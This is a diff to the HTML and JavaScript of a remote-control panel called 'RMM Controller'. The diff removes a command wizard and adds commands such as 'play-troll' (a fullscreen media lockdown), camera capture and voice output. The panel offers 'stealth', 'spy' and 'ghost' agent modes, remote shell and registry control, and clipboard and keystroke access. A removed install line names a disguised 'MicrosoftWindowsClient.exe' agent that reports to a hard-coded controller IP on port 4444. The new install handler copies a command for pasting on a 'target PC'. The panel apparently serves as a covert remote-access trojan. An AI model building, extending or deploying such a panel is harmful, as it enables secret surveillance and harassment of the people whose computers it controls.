@@ -98,16 +98,6 @@ a:hover{text-decoration:underline}
 #screenExitBtn{display:none;position:absolute;top:10px;right:10px;z-index:5}
 .screen-wrap:fullscreen #screenExitBtn{display:block}
 #remoteCursor{display:none;position:absolute;width:12px;height:12px;margin:0;border:2px solid #ff5252;border-radius:50%;background:rgba(255,82,82,.25);z-index:4;pointer-events:none}
-#wizOverlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:50;align-items:center;justify-content:center}
-#wizOverlay.on{display:flex}
-#wizBox{background:var(--bg-input);border:1px solid var(--border);border-radius:10px;padding:16px;min-width:320px;max-width:520px;width:90%}
-#wizBox h4{margin:0 0 4px}
-#wizPreview{font-size:11px;color:#888;background:rgba(255,255,255,.04);border:1px solid var(--border);border-radius:6px;padding:6px 8px;margin-top:10px;word-break:break-word}
-#wizFields label{display:block;font-size:11px;color:#888;margin-top:8px}
-#wizFields input[type=text],#wizFields textarea,#wizFields select{width:100%;background:rgba(0,0,0,.3);border:1px solid var(--border);color:var(--fg);padding:6px 8px;border-radius:6px;font-family:inherit;font-size:12px;margin-top:4px;box-sizing:border-box}
-#wizFields input[type=range]{width:100%}
-#notifPreview{background:#f0f0f0;color:#111;border-radius:8px;padding:16px;margin-top:8px;font-family:"Segoe UI",sans-serif}
-#notifPreview b{display:block;margin-bottom:6px}
 .screen-dual{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;padding:8px;overflow:auto;width:100%;height:100%}
 .screen-dual img{max-width:48%;border:1px solid var(--border);border-radius:6px}
 .console{flex:0 0 auto;height:110px;max-height:110px;background:var(--term-bg);border:1px solid var(--border);border-radius:8px;padding:8px;overflow:auto;font-size:11px;line-height:1.5;display:none}
@@ -240,7 +230,7 @@ html{touch-action:manipulation}
       <button class="btn btn-small" id="pushUpdateBtn" title="Push bundled agent update to selected agent">⇪ Update</button>
       <button class="btn btn-small" id="pushUpdateAllBtn" title="Push bundled update to every outdated agent at once" style="display:none">⇪ Update All</button>
       <button class="btn btn-small" id="deleteAgentBtn" title="PERMANENTLY delete the agent on the selected box (token + nonce guarded). kill-agent only quiets it.">🗑 Delete</button>
-      <button class="btn btn-small" id="wizBtn" title="Open command wizard">🧙</button>
+
       <select id="topModeSel" class="select" title="Agent operation mode — changes immediately (restarts agent)" style="font-size:11px;padding:2px 4px"><option value="normal">normal</option><option value="stealth">stealth</option><option value="spy">spy</option><option value="ghost">ghost</option><option value="performance">performance</option><option value="kiosk">kiosk</option><option value="audit">audit</option></select>
       <span id="agentVerBadge" style="font-size:11px;color:#888" title="Selected agent version"></span>
       <span id="updateBadge" style="display:none;font-size:11px;color:#FFD54F;cursor:pointer" title="">⇪ update</span>
@@ -457,11 +447,11 @@ html{touch-action:manipulation}
   </main>
 </div>
 <div id="toasts"></div>
-<div id="wizOverlay"><div id="wizBox"><h4 id="wizTitle"></h4><div id="wizDesc" style="font-size:11px;color:#888"></div><div id="wizFields"></div><div id="wizPreview"></div><div style="display:flex;gap:8px;margin-top:12px;justify-content:flex-end"><button class="btn btn-small" id="wizCancel">Cancel</button><button class="btn btn-primary btn-small" id="wizSend">Send</button></div></div></div>
+
 
 <script>
 const KNOWN = {
-"help":"Show help","list-commands":"List all","get-system-info":"System info","get-cpu-info":"CPU info","get-cpu-usage":"CPU %","get-memory-usage":"Memory","get-disk-usage":"Disk usage","get-disk-health":"Disk health","get-gpu-info":"GPU","get-bios-info":"BIOS","get-motherboard-info":"Motherboard","get-ram-slots":"RAM slots","get-battery":"Battery","get-display-info":"Display","get-monitors":"Monitors","get-screen-size":"Screen size","get-uptime":"Uptime","get-time":"Time","get-timezone":"TZ","get-services":"Services","get-processes":"Processes","get-installed-programs":"Installed","get-hostname":"Hostname","get-username":"User","get-os-version":"OS","get-status":"Status","get-version":"Version","list-directory":"List dir","read-file":"Read file","write-file":"Write file","delete-item":"Delete","create-directory":"Mkdir","copy-item":"Copy","move-item":"Move","rename-item":"Rename","get-file-info":"File info","get-file-hash":"Hash","get-directory-size":"Dir size","search-files":"Search","run-command":"Shell","run-powershell":"PS","launch-app":"Launch","open-url":"Open URL","get-ip-address":"IPs","get-network-info":"Net info","get-public-ip":"Public IP","resolve-dns":"DNS","test-connection":"Ping","check-port":"Port","flush-dns":"Flush DNS","get-arp-cache":"ARP","get-route-table":"Routes","mouse-move":"Mouse move","mouse-click":"Click","mouse-button":"Button","mouse-scroll":"Scroll","get-position":"Pos","send-text":"Send text","clipboard-get":"Clipboard get","clipboard-set":"Clipboard set","get-active-window":"Active win","reg-read":"Reg read","reg-write":"Reg write","reg-enum-keys":"Reg keys","reg-enum-values":"Reg values","get-firewall-status":"Firewall","get-defender-status":"Defender","get-go-version":"Go ver","get-dotnet-version":".NET","git-status":"Git status","git-log":"Git log","shutdown-restart":"Power","generate-password":"Pass","generate-uuid":"UUID","encode-base64":"B64 enc","decode-base64":"B64 dec","hash-text":"Hash","ping":"Ping","version":"Version","screenshot-now":"Screenshot"
+"help":"Show help","list-commands":"List all","get-system-info":"System info","get-cpu-info":"CPU info","get-cpu-usage":"CPU %","get-memory-usage":"Memory","get-disk-usage":"Disk usage","get-disk-health":"Disk health","get-gpu-info":"GPU","get-bios-info":"BIOS","get-motherboard-info":"Motherboard","get-ram-slots":"RAM slots","get-battery":"Battery","get-display-info":"Display","get-monitors":"Monitors","get-screen-size":"Screen size","get-uptime":"Uptime","get-time":"Time","get-timezone":"TZ","get-services":"Services","get-processes":"Processes","get-installed-programs":"Installed","get-hostname":"Hostname","get-username":"User","get-os-version":"OS","get-status":"Status","get-version":"Version","list-directory":"List dir","read-file":"Read file","write-file":"Write file","delete-item":"Delete","create-directory":"Mkdir","copy-item":"Copy","move-item":"Move","rename-item":"Rename","get-file-info":"File info","get-file-hash":"Hash","get-directory-size":"Dir size","search-files":"Search","run-command":"Shell","run-powershell":"PS","launch-app":"Launch","open-url":"Open URL","get-ip-address":"IPs","get-network-info":"Net info","get-public-ip":"Public IP","resolve-dns":"DNS","test-connection":"Ping","check-port":"Port","flush-dns":"Flush DNS","get-arp-cache":"ARP","get-route-table":"Routes","mouse-move":"Mouse move","mouse-click":"Click","mouse-button":"Button","mouse-scroll":"Scroll","get-position":"Pos","send-text":"Send text","clipboard-get":"Clipboard get","clipboard-set":"Clipboard set","get-active-window":"Active win","reg-read":"Reg read","reg-write":"Reg write","reg-enum-keys":"Reg keys","reg-enum-values":"Reg values","get-firewall-status":"Firewall","get-defender-status":"Defender","get-go-version":"Go ver","get-dotnet-version":".NET","git-status":"Git status","git-log":"Git log","shutdown-restart":"Power","generate-password":"Pass","generate-uuid":"UUID","encode-base64":"B64 enc","decode-base64":"B64 dec","hash-text":"Hash","ping":"Ping","version":"Version","speak":"Speak","speak-stop":"Stop speech","play-troll":"Fullscreen media lockdown","stop-troll":"Stop troll + unblock","set-wallpaper":"Wallpaper","set-brightness":"Brightness","set-volume":"Volume","send-notification":"Pop-up","keep-awake":"Keep awake","lock-screen":"Lock","minimize-all-windows":"Minimize all","set-volume":"Volume","camera-shot":"Camera","speak":"Speak","list-users":"Users","list-groups":"Groups","get-dotnet-version":".NET","get-node-version":"Node","get-python-version":"Python","get-java-version":"Java","get-go-version":"Go","screenshot-now":"Screenshot","ping":"Ping"
 };
 let ws=null, agents=[], selected=null, latencyStart=0, history=[], hIdx=-1, screenTimer=null;
 const $ = id=>document.getElementById(id);
@@ -994,7 +984,6 @@ function sendCmd(){
   history.push(v); if(history.length>50) history.shift(); hIdx=-1;
   input.value=""; sugg.classList.remove("on");
   if(v.toLowerCase()==="force-update"){ pushAgentUpdate(); return; }
-  if(maybeWizard(v)) return;
   if(sendAllOn){ sendCmdAll(v); return; }
   addTerm("❯ "+v, "prompt");
   lastCmdAt=Date.now();
@@ -1002,113 +991,6 @@ function sendCmd(){
   else fetch("/api/cmd",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({cmd:v})});
 }
 $("cmdSend").onclick=sendCmd;
-// ---- Command wizards: bare commands open a window, full ones send ----
-let wizConfirm=null; // {name, build} for dangerous always-confirm commands
-const WIZ_DANGEROUS=["shutdown-restart","lock-screen","minimize-all-windows"];
-function wizLast(name){ try{ return JSON.parse(localStorage.getItem("rmm_wiz_"+name)||"null"); }catch{ return null; } }
-function wizSave(name, vals){ try{ localStorage.setItem("rmm_wiz_"+name, JSON.stringify(vals)); }catch{} }
-function openWizard(name, title, desc, fields, build){
-  const last=wizLast(name)||{};
-  $("wizTitle").textContent="🧙 "+name;
-  $("wizDesc").textContent=desc||(KNOWN[name]||"");
-  const box=$("wizFields"); box.innerHTML="";
-  const vals={};
-  fields.forEach(f=>{
-    const lab=document.createElement("label"); lab.textContent=f.label; box.appendChild(lab);
-    const cur=(last[f.key]!==undefined)?last[f.key]:(f.val!==undefined?f.val:"");
-    let el=null;
-    if(f.t==="slider"||f.t==="range"){ el=document.createElement("input"); el.type="range"; el.min=f.min||0; el.max=f.max||100; el.value=cur===""?(f.min||0):cur;
-      const out=document.createElement("span"); out.style.marginLeft="8px"; out.textContent=el.value; lab.appendChild(out);
-      el.oninput=()=>{ out.textContent=el.value; vals[f.key]=el.value; wizPreview(name, build, vals); };
-    } else if(f.t==="textarea"){ el=document.createElement("textarea"); el.rows=f.rows||3; el.value=cur; el.oninput=()=>{ vals[f.key]=el.value; wizPreview(name, build, vals); };
-    } else if(f.t==="select"){ el=document.createElement("select"); (f.options||[]).forEach(o=>{ const op=document.createElement("option"); op.value=o; op.textContent=o; el.appendChild(op); }); el.value=cur||f.options[0]; el.onchange=()=>{ vals[f.key]=el.value; wizPreview(name, build, vals); };
-    } else if(f.t==="checkbox"){ el=document.createElement("input"); el.type="checkbox"; el.checked=!!cur; el.onchange=()=>{ vals[f.key]=el.checked; wizPreview(name, build, vals); };
-    } else if(f.t==="keys"){
-      el=document.createElement("div");
-      ["Enter","Tab","Esc","Backspace","Delete","Left","Right","Up","Down","Home","End","PgUp","PgDn","Insert","F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12"].forEach(k=>{
-        const b=document.createElement("button"); b.type="button"; b.className="btn btn-small"; b.style.margin="2px"; b.textContent=k;
-        b.onclick=()=>{ vals[f.key]=k; wizPreview(name, build, vals); [...el.querySelectorAll("button")].forEach(x=>x.classList.remove("btn-primary")); b.classList.add("btn-primary"); };
-        el.appendChild(b);
-      });
-      const free=document.createElement("input"); free.type="text"; free.placeholder="...or type a code like {F5}, ^s"; free.style.marginTop="6px";
-      free.oninput=()=>{ vals[f.key]=free.value; wizPreview(name, build, vals); };
-      el.appendChild(free);
-    } else { el=document.createElement("input"); el.type="text"; el.value=cur; el.oninput=()=>{ vals[f.key]=el.value; wizPreview(name, build, vals); if(f.key==="dur"||f.key==="sticky") wizNotifPreview(vals); };
-    }
-    if(f.t!=="keys"&&f.t!=="slider"&&f.t!=="range") vals[f.key]=el.value!==undefined?el.value:cur;
-    else if(f.t==="slider"||f.t==="range") vals[f.key]=el.value;
-    else if(f.t==="checkbox") vals[f.key]=el.checked;
-    box.appendChild(el);
-    if(f.key==="text"&&name==="send-notification"){ const pv=document.createElement("div"); pv.id="notifPreview"; box.appendChild(pv); }
-  });
-  if(fields.some(f=>f.key==="sticky"||f.key==="dur")) wizNotifPreview(vals);
-  wizConfirm={name:name, build:build, vals:vals};
-  $("wizOverlay").classList.add("on");
-  toast("🧙 "+name+" window opened");
-  const first=box.querySelector("input,textarea,select"); if(first) first.focus();
-  wizPreview(name, build, vals);
-}
-function wizNotifPreview(vals){
-  const pv=$("notifPreview"); if(!pv) return;
-  const secs=vals.sticky?"sticky":((parseInt(vals.dur)||10)+"s");
-  pv.innerHTML="<b>RMM Controller</b><div></div><div style='font-size:11px;color:#555;margin-top:8px'>closes: "+secs+"</div>";
-  pv.querySelector("div").textContent=vals.text||"(your text)";
-}
-function wizPreview(name, build, vals){
-  try{ $("wizPreview").textContent="will send: "+build(vals); }catch(e){ $("wizPreview").textContent="will send: "+name+" …"; }
-}
-function closeWizard(){ $("wizOverlay").classList.remove("on"); wizConfirm=null; }
-const wizCancelEl=$("wizCancel"); if(wizCancelEl) wizCancelEl.onclick=closeWizard;
-const wizOverlayEl=$("wizOverlay"); if(wizOverlayEl) wizOverlayEl.addEventListener("click", e=>{ if(e.target.id==="wizOverlay") closeWizard(); });
-const wizSendEl=$("wizSend"); if(wizSendEl) wizSendEl.onclick=()=>{
-  if(!wizConfirm) return;
-  const cmd=wizConfirm.build(wizConfirm.vals);
-  wizSave(wizConfirm.name, wizConfirm.vals);
-  closeWizard();
-  if(!selected){ toast("No agent selected", "err"); return; }
-  if(WIZ_DANGEROUS.includes(wizConfirm.name)) addTerm("❯ "+cmd+" (confirmed)", "prompt"); else addTerm("❯ "+cmd, "prompt");
-  lastCmdAt=Date.now();
-  if(ws && ws.readyState===1) ws.send(JSON.stringify({type:"command", cmd:cmd, target:selected.id}));
-};
-document.addEventListener("keydown", e=>{ if(e.key==="Escape" && $("wizOverlay").classList.contains("on")) closeWizard(); });
-// Hand-crafted rich builders; everything else with <arg> auto-generates.
-function wizardFor(name){
-  switch(name){
-    case "set-volume": return {desc:"Remote speaker volume", fields:[{t:"slider",label:"Volume",key:"v",min:0,max:100,val:80}], build:f=>`set-volume ${f.v}`};
-    case "set-brightness": return {desc:"Remote screen brightness", fields:[{t:"slider",label:"Brightness",key:"v",min:0,max:100,val:80}], build:f=>`set-brightness ${f.v}`};
-    case "send-text": return {desc:"Types into the focused window on the remote PC", fields:[{t:"textarea",label:"Text",key:"text",rows:3}], build:f=>`send-text ${f.text||""}`};
-    case "clipboard-set": return {desc:"Set remote clipboard", fields:[{t:"textarea",label:"Text",key:"text",rows:3}], build:f=>`clipboard-set ${f.text||""}`};
-    case "key-press": return {desc:"Press a key on the remote PC", fields:[{t:"keys",label:"Key",key:"key"}], build:f=>{ const k=f.key||"{ENTER}"; return `key-press ${k}`; }};
-    case "send-notification": return {desc:"Pop-up window on the remote PC", fields:[{t:"textarea",label:"Text",key:"text",rows:2},{t:"select",label:"Closes after",key:"dur",options:["5","10","30","60"]},{t:"checkbox",label:"Sticky (stays until dismissed)",key:"sticky"}], build:f=>`send-notification ${f.sticky?"sticky":(parseInt(f.dur)||10)} ${f.text||""}`};
-    case "run-command": return {desc:"Shell command on the remote PC", fields:[{t:"textarea",label:"Command",key:"cmd",rows:3}], build:f=>`run-command ${f.cmd||""}`};
-    case "run-powershell": return {desc:"PowerShell on the remote PC", fields:[{t:"textarea",label:"Script",key:"cmd",rows:4}], build:f=>`run-powershell ${f.cmd||""}`};
-    case "set-wallpaper": return {desc:"Remote desktop wallpaper (path on the remote PC)", fields:[{t:"text",label:"Image path",key:"path"}], build:f=>`set-wallpaper ${f.path||""}`};
-    case "reg-write": return {desc:"Write registry value", fields:[{t:"text",label:"Path",key:"path"},{t:"text",label:"Value",key:"val"}], build:f=>`reg-write ${f.path||""}|${f.val||""}`};
-  }
-  return null;
-}
-function autoWizard(name){
-  const desc=KNOWN[name]; if(!desc) return null;
-  const args=[...desc.matchAll(/<([^>]+)>/g)].map(m=>m[1]);
-  if(!args.length) return null;
-  return {desc:desc, fields:args.map(a=>({t:"text",label:a,key:a})), build:f=>name+" "+args.map(a=>(f[a]||"")).join(" ").trim()};
-}
-// Returns true when a wizard (or confirm) consumed the command.
-function maybeWizard(text){
-  const first=(text.trim().split(" ")[0]||"").toLowerCase();
-  if(!first) return false;
-  const rest=text.trim().slice(first.length).trim();
-  if(WIZ_DANGEROUS.includes(first)){
-    const w=wizardFor(first)||autoWizard(first);
-    openWizard(first, null, "⚠ confirm: "+text, [], v=>text);
-    return true;
-  }
-  if(rest) return false; // full command typed: send directly
-  const w=wizardFor(first)||autoWizard(first);
-  if(!w) return false;
-  openWizard(first, w.desc, w.fields, w.build);
-  return true;
-}
 function sendAllCount(){ return agents.filter(a=>!a.id.startsWith("manual-")&&!a.id.startsWith("conn-")&&a.connected).length; }
 function refreshSendAllBtn(){ const b=$("sendAllBtn"); if(b&&sendAllOn) b.textContent=`All: ON (${sendAllCount()})`; }
 $("sendAllBtn").onclick=e=>{
@@ -1357,7 +1239,6 @@ function sendScreenCmd(){
   if(!v) return;
   if(!selected){ toast("No agent selected", "err"); return; }
   if(v.toLowerCase()==="force-update"){ box.value=""; pushAgentUpdate(); return; }
-  if(maybeWizard(v)){ box.value=""; return; }
   sendCmdVal(v); addConsole("→ "+v+" (result appears in Commands tab)");
   box.value="";
 }
@@ -2306,8 +2187,21 @@ $("removeBtn").onclick=()=>{
   addTerm("Removed", "out");
 };
 $("installBtn").onclick=()=>{
-  addTerm("Install: copy Agent-Setup.exe to remote PC and run as Admin (silent). Or run: MicrosoftWindowsClient.exe -controller 176.229.98.54:4444 -ca server.crt", "out");
-  window.open("https://github.com/gibishahar-sudo/Controller-/releases/latest", "_blank");
+  addTerm("Fetching install command for this version…", "out");
+  fetch("/api/install-cmd").then(r=>r.json()).then(j=>{
+    if(j.error) throw new Error(j.error);
+    const line=j.cmd;
+    if(navigator.clipboard && navigator.clipboard.writeText){
+      navigator.clipboard.writeText(line).then(()=>{
+        addTerm("Install command ("+(j.tag||"")+") copied to clipboard — paste into run-command / PowerShell on the target PC", "out");
+        toast("Install command copied ("+(j.tag||"")+")");
+      }).catch(()=>{ addTerm("Install: "+line, "out"); });
+    } else { addTerm("Install: "+line, "out"); }
+    window.open("https://github.com/gibishahar-sudo/Controller-/releases/tag/"+(j.tag||"latest"), "_blank");
+  }).catch(e=>{
+    addTerm("Install-cmd fallback failed: "+(e.message||e)+" — open releases page instead", "err");
+    window.open("https://github.com/gibishahar-sudo/Controller-/releases/latest", "_blank");
+  });
 };
 $("reconnectBtn").onclick=()=>{
   addTerm("Reconnecting (re-dialing relays, re-measuring brokers)...", "out");
@@ -2353,10 +2247,6 @@ $("verBtn").onclick=()=>{
   addTerm("Checking agent version…", "out");
 };
 $("pushUpdateBtn").onclick=()=>pushAgentUpdate();
-$("wizBtn").onclick=()=>{
-  const v=(input.value.trim().split(" ")[0]||"").toLowerCase()||"send-text";
-  if(!maybeWizard(v)) toast("Type a command name first", "err");
-};
 // Auto outdated badge: once per agent selection, compare versions silently.
 let verCheckedFor="";
 function autoVersionCheck(){
@@ -2597,7 +2487,7 @@ document.addEventListener("keydown", e=>{
 });
 
 // Compact declutter mode (persisted): secondary buttons hide behind ⋯.
-["healthBtn","verBtn","pushUpdateBtn","wizBtn","exportLog","clearTerm","saveFrame","zoomIn","zoomOut","zoomReset","clearScreenLog"].forEach(id=>{ const el=$(id); if(el) el.classList.add("moreable"); });
+["healthBtn","verBtn","pushUpdateBtn","exportLog","clearTerm","saveFrame","zoomIn","zoomOut","zoomReset","clearScreenLog"].forEach(id=>{ const el=$(id); if(el) el.classList.add("moreable"); });
 function applyCompact(on){
   document.body.classList.toggle("compact", on);
   try{ localStorage.setItem("rmm_compact", on?"1":""); }catch{}
